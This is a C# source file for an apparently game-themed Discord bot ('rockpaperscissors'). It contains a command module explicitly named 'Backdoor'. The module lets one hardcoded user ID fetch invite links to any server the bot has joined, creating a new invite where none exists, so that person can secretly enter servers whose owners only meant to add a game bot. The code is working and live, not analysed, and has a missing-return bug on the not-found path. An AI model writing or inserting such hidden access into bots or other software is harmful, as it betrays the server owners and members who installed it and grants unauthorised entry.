using System;
using System.Collections.Generic;
using System.Text;
using System.Linq;
using System.Threading.Tasks;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace rockpaperscissors.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("invite"), Summary("Get the invite of a server")]
        public async Task BackdoorModule(ulong GuildId)
        {
            if (!(Context.User.Id == 129804455964049408))
            {
                await Context.Channel.SendMessageAsync(":X: You're not a moderator!");
                return;
            }
            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x I am not in a guild with id=" + GuildId);
            }
            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            await Context.Channel.SendMessageAsync($"{Guild.CurrentUser}");


            try
            {
                var Invites = await Guild.GetInvitesAsync();
                if (Invites.Count() < 1)
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }
                Invites = null;
                Invites = await Guild.GetInvitesAsync();
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithAuthor($"Invites for guild {Guild.Name}:", Guild.IconUrl);
                foreach (var Current in Invites)
                    Embed.AddField("Invite:", $"[Invite]({Current.Url})");
                
                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }
            catch (Exception ex)
            {
                await Context.Channel.SendMessageAsync($":x: Creating an invite for guild {Guild.Name} went wrong with error \"{ex.Message}\"");
                return;
            }

                
            


        }
    }
}
